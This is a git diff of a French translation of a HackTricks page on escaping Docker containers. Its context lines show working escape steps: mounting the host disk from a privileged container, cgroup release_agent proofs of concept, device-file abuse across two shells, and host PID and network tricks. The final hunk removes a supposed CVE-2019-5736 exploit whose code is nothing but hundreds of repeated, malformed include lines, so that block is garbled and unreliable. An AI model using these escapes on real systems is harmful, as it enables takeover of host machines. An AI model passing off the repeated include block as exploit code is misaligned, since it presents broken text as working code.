@@ -2,19 +2,19 @@
 
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert Red Team AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
 Autres façons de soutenir HackTricks :
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
 
-<figure><img src="../../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
@@ -26,14 +26,14 @@ Accédez dès aujourd'hui :
 
 * [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) : Il peut également **énumérer les conteneurs**
 * [**CDK**](https://github.com/cdk-team/CDK#installationdelivery) : Cet outil est assez **utile pour énumérer le conteneur dans lequel vous vous trouvez et même essayer de s'échapper automatiquement**
-* [**amicontained**](https://github.com/genuinetools/amicontained) : Outil utile pour obtenir les privilèges que le conteneur possède afin de trouver des moyens de s'échapper
+* [**amicontained**](https://github.com/genuinetools/amicontained) : Outil utile pour obtenir les privilèges du conteneur afin de trouver des moyens de s'échapper
 * [**deepce**](https://github.com/stealthcopter/deepce) : Outil pour énumérer et s'échapper des conteneurs
 * [**grype**](https://github.com/anchore/grype) : Obtenez les CVE contenus dans le logiciel installé dans l'image
 
 ## Évasion du Socket Docker Monté
 
-Si vous trouvez que le **socket docker est monté** à l'intérieur du conteneur Docker, vous pourrez vous échapper.\
-Cela se produit généralement dans les conteneurs Docker qui, pour une raison quelconque, doivent se connecter au démon Docker pour effectuer des actions.
+Si vous trouvez que le **socket docker est monté** à l'intérieur du conteneur Docker, vous pourrez vous en échapper.\
+Cela se produit généralement dans les conteneurs Docker qui, pour une raison quelconque, ont besoin de se connecter au démon Docker pour effectuer des actions.
 ```bash
 #Search the socket
 find / -name docker.sock 2>/dev/null
@@ -57,7 +57,7 @@ docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --se
 Au cas où le **socket docker est à un emplacement inattendu**, vous pouvez toujours communiquer avec lui en utilisant la commande **`docker`** avec le paramètre **`-H unix:///chemin/vers/docker.sock`**
 {% endhint %}
 
-Le démon Docker peut également [écouter sur un port (par défaut 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ou sur les systèmes basés sur Systemd, la communication avec le démon Docker peut se faire via le socket Systemd `fd://`.
+Le démon Docker peut également être [en écoute sur un port (par défaut 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ou sur les systèmes basés sur Systemd, la communication avec le démon Docker peut se faire via le socket Systemd `fd://`.
 
 {% hint style="info" %}
 De plus, faites attention aux sockets d'exécution des autres runtimes de haut niveau :
@@ -78,13 +78,13 @@ Vous pouvez vérifier les capacités actuelles du conteneur en utilisant les **o
 ```bash
 capsh --print
 ```
-Sur la page suivante, vous pouvez **en savoir plus sur les capacités de Linux** et comment les abuser pour échapper/escalader les privilèges :
+Sur la page suivante, vous pouvez **en apprendre davantage sur les capacités de Linux** et comment les abuser pour échapper/escalader les privilèges :
 
 {% content-ref url="../../linux-capabilities.md" %}
 [linux-capabilities.md](../../linux-capabilities.md)
 {% endcontent-ref %}
 
-## Évasion des conteneurs privilégiés
+## Échapper des conteneurs privilégiés
 
 Un conteneur privilégié peut être créé avec le drapeau `--privileged` ou en désactivant des défenses spécifiques :
 
@@ -98,7 +98,7 @@ Un conteneur privilégié peut être créé avec le drapeau `--privileged` ou en
 * `--cgroupns=host`
 * `Mount /dev`
 
-Le drapeau `--privileged` abaisse considérablement la sécurité du conteneur, offrant un **accès aux périphériques non restreint** et contournant **plusieurs protections**. Pour une analyse détaillée, consultez la documentation sur les impacts complets de `--privileged`.
+Le drapeau `--privileged` diminue considérablement la sécurité du conteneur, offrant un **accès aux périphériques non restreint** et contournant **plusieurs protections**. Pour une analyse détaillée, consultez la documentation sur les impacts complets de `--privileged`.
 
 {% content-ref url="../docker-privileged.md" %}
 [docker-privileged.md](../docker-privileged.md)
@@ -122,11 +122,11 @@ docker run --rm -it --privileged ubuntu bash
 ```
 #### Montage du disque - Poc1
 
-Les conteneurs Docker bien configurés ne permettront pas des commandes telles que **fdisk -l**. Cependant, sur une commande Docker mal configurée où le drapeau `--privileged` ou `--device=/dev/sda1` avec des capacités est spécifié, il est possible d'obtenir les privilèges pour voir le lecteur hôte.
+Les conteneurs Docker bien configurés n'autoriseront pas des commandes telles que **fdisk -l**. Cependant, sur une commande Docker mal configurée où le drapeau `--privileged` ou `--device=/dev/sda1` avec des privilèges est spécifié, il est possible d'obtenir les privilèges pour voir le lecteur hôte.
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
-Donc, pour prendre le contrôle de la machine hôte, c'est trivial:
+Donc, pour prendre le contrôle de la machine hôte, c'est trivial :
 ```bash
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
@@ -135,7 +135,7 @@ Et voilà ! Vous pouvez désormais accéder au système de fichiers de l'hôte c
 
 #### Montage du disque - Poc2
 
-Au sein du conteneur, un attaquant peut tenter d'obtenir un accès supplémentaire au système d'exploitation hôte sous-jacent via un volume hostPath inscriptible créé par le cluster. Voici quelques éléments courants que vous pouvez vérifier dans le conteneur pour voir si vous pouvez exploiter ce vecteur d'attaque :
+À l'intérieur du conteneur, un attaquant peut tenter d'obtenir un accès supplémentaire au système d'exploitation hôte sous-jacent via un volume hostPath inscriptible créé par le cluster. Voici quelques éléments courants que vous pouvez vérifier à l'intérieur du conteneur pour voir si vous pouvez exploiter ce vecteur d'attaque :
 ```bash
 ### Check if You Can Write to a File-system
 echo 1 > /proc/sysrq-trigger
@@ -194,7 +194,7 @@ cat /o
 ```
 {% endcode %}
 
-#### Évasion des privilèges en abusant de l'agent de libération créé ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
+#### Évasion des privilèges en abusant de l'agent de sortie créé ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
 
 {% code title="Deuxième PoC" %}
 ```bash
@@ -248,7 +248,7 @@ Trouvez une **explication de la technique** dans :
 
 #### Évasion des privilèges en abusant de release\_agent sans connaître le chemin relatif - PoC3
 
-Dans les exploits précédents, le **chemin absolu du conteneur à l'intérieur du système de fichiers de l'hôte est divulgué**. Cependant, ce n'est pas toujours le cas. Dans les cas où vous **ne connaissez pas le chemin absolu du conteneur à l'intérieur de l'hôte**, vous pouvez utiliser cette technique :
+Dans les exploits précédents, le **chemin absolu du conteneur à l'intérieur du système de fichiers hôte est divulgué**. Cependant, ce n'est pas toujours le cas. Dans les cas où vous **ne connaissez pas le chemin absolu du conteneur à l'intérieur de l'hôte**, vous pouvez utiliser cette technique :
 
 {% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
 [release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
@@ -342,7 +342,7 @@ root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ```
 #### Évasion de privilèges en abusant des montages sensibles
 
-Il existe plusieurs fichiers qui pourraient être montés et qui donnent des **informations sur l'hôte sous-jacent**. Certains d'entre eux peuvent même indiquer **quelque chose à exécuter par l'hôte lorsqu'un événement se produit** (ce qui permettrait à un attaquant de s'échapper du conteneur).\
+Il existe plusieurs fichiers qui pourraient être montés et donner des **informations sur l'hôte sous-jacent**. Certains d'entre eux peuvent même indiquer **quelque chose à exécuter par l'hôte lorsqu'un événement se produit** (ce qui permettrait à un attaquant de s'échapper du conteneur).\
 L'abus de ces fichiers peut permettre :
 
 * release\_agent (déjà abordé précédemment)
@@ -377,9 +377,9 @@ bash -p #From non priv inside mounted folder
 ### Élévation de privilèges avec 2 shells
 
 Si vous avez un accès en tant que **root à l'intérieur d'un conteneur** et que vous avez **échappé en tant qu'utilisateur non privilégié vers l'hôte**, vous pouvez abuser des deux shells pour **élever les privilèges à l'intérieur de l'hôte** si vous avez la capacité MKNOD à l'intérieur du conteneur (c'est par défaut) comme [**expliqué dans ce post**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
-Avec une telle capacité, l'utilisateur root à l'intérieur du conteneur est autorisé à **créer des fichiers de périphériques blocs**. Les fichiers de périphériques sont des fichiers spéciaux utilisés pour **accéder au matériel sous-jacent et aux modules du noyau**. Par exemple, le fichier de périphérique bloc /dev/sda donne accès à **lire les données brutes sur le disque du système**.
+Avec une telle capacité, l'utilisateur root à l'intérieur du conteneur est autorisé à **créer des fichiers de périphérique bloc**. Les fichiers de périphérique sont des fichiers spéciaux utilisés pour **accéder au matériel sous-jacent et aux modules du noyau**. Par exemple, le fichier de périphérique bloc /dev/sda donne accès à **lire les données brutes sur le disque du système**.
 
-Docker se protège contre l'abus des fichiers de périphériques blocs à l'intérieur des conteneurs en imposant une politique cgroup qui **bloque les opérations de lecture/écriture des fichiers de périphériques blocs**. Néanmoins, si un fichier de périphérique bloc est **créé à l'intérieur du conteneur**, il devient accessible depuis l'extérieur du conteneur via le répertoire **/proc/PID/root/**. Cet accès nécessite que le **propriétaire du processus soit le même** à la fois à l'intérieur et à l'extérieur du conteneur.
+Docker se protège contre l'abus des fichiers de périphérique bloc à l'intérieur des conteneurs en imposant une politique cgroup qui **bloque les opérations de lecture/écriture des fichiers de périphérique bloc**. Néanmoins, si un fichier de périphérique bloc est **créé à l'intérieur du conteneur**, il devient accessible depuis l'extérieur du conteneur via le répertoire **/proc/PID/root/**. Cet accès nécessite que le **propriétaire du processus soit le même** à la fois à l'intérieur et à l'extérieur du conteneur.
 
 Exemple d'**exploitation** de ce [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
 ```bash
@@ -419,7 +419,7 @@ HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
 ```
 ### hostPID
 
-Si vous pouvez accéder aux processus de l'hôte, vous pourrez accéder à de nombreuses informations sensibles stockées dans ces processus. Exécutez le laboratoire de test :
+Si vous pouvez accéder aux processus de l'hôte, vous pourrez accéder à de nombreuses informations sensibles stockées dans ces processus. Exécutez le laboratoire de test:
 ```
 docker run --rm -it --pid=host ubuntu bash
 ```
@@ -454,7 +454,7 @@ Si vous avez d'une manière ou d'une autre un **accès privilégié sur un proce
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
-Si un conteneur est configuré avec le pilote de réseau hôte Docker (`--network=host`), la pile réseau de ce conteneur n'est pas isolée de l'hôte Docker (le conteneur partage l'espace de nom de réseau de l'hôte) et le conteneur ne reçoit pas d'adresse IP propre. En d'autres termes, le **conteneur lie tous les services directement à l'IP de l'hôte**. De plus, le conteneur peut **intercepter TOUT le trafic réseau que l'hôte** envoie et reçoit sur l'interface partagée `tcpdump -i eth0`.
+Si un conteneur est configuré avec le pilote de réseau hôte Docker (`--network=host`), la pile réseau de ce conteneur n'est pas isolée de l'hôte Docker (le conteneur partage l'espace de nom réseau de l'hôte) et le conteneur ne reçoit pas d'adresse IP propre. En d'autres termes, le **conteneur lie tous les services directement à l'IP de l'hôte**. De plus, le conteneur peut **intercepter TOUT le trafic réseau que l'hôte** envoie et reçoit sur l'interface partagée `tcpdump -i eth0`.
 
 Par exemple, vous pouvez utiliser cela pour **sniffer et même falsifier le trafic** entre l'hôte et l'instance de métadonnées.
 
@@ -486,10 +486,10 @@ cat /proc/self/status | grep CapEff
 
 La deuxième technique expliquée dans l'article [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indique comment vous pouvez abuser des montages de liaison avec les espaces utilisateurs, pour affecter les fichiers à l'intérieur de l'hôte (dans ce cas spécifique, supprimer des fichiers).
 
-<figure><img src="../../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
-Obtenez l'accès aujourd'hui :
+Accédez dès aujourd'hui :
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
@@ -545,7 +545,7 @@ Il existe d'autres CVE auxquelles le conteneur peut être vulnérable, vous pouv
 ```
 {% endtab %}
 
-{% onglet title="appels système arm64" %}
+{% onglet title = "appels système arm64" %}
 ```
 0x029 -- pivot_root
 0x059 -- acct
@@ -565,609 +565,7 @@ Il existe d'autres CVE auxquelles le conteneur peut être vulnérable, vous pouv
 ```
 {% endtab %}
 
-{% tab title="syscall_bf.c" %} 
-
-## Docker Breakout Privilege Escalation
-
-### Description
-
-This exploit leverages a known vulnerability in Docker that allows an attacker to escape from a Docker container and gain root access on the host system.
-
-### Usage
-
-Compile the `syscall_bf.c` code and run the generated binary inside a Docker container to escalate privileges.
-
-### Impact
-
-Successful exploitation of this vulnerability can lead to a complete compromise of the host system.
-
-### Recommendation
-
-Regularly update Docker to the latest version and follow security best practices to mitigate the risk of privilege escalation attacks.
-
-### Reference
-
-- [Docker Breakout Privilege Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout-privilege-escalation)
-
-### Author
-
-Unknown
-
-### Publication Date
-
-Unknown
-
-### Cve Number
-
-CVE-2019-5736
-
-### Exploit Code
-
-```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/syscall.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <sched.h>
-#include <signal.h>
-#include <string.h>
-#include <errno.h>
-#include <sys/mount.h>
-#include <sys/stat.h>
-#include <fcntl.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#includejson.h>
-#include <sys/prctl.h>
-#include <linux/seccomp.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#includejson.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#includejson.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#includejson.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include#includejson.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include <linux/limits.h>
-#include#includejson.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit.h>
-#include <linux/sched.h>
-#include <linux/capability.h>
-#include <linux/ptrace.h>
-#include <linux/bpf.h>
-#include <linux/version.h>
-#include#includejson.h>
-#include <linux/limits.h>
-#include <linux/ip.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/if_packet.h>
